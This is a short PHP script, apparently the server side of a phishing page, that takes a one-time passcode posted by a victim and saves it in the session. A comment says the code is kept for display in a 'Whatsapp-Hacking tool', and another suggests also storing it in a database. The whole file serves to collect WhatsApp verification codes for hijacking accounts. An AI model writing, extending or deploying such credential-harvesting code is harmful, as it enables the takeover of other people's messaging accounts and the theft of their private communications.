<?php
session_start();

if (isset($_POST['otp'])) {
    // Capture OTP and store it in session for displaying in your Whatsapp-Hacking tool
    $_SESSION['otp'] = $_POST['otp'];

    // You can also store this OTP in a database if needed
}

// Redirect the user if needed, or handle other logic here
?>
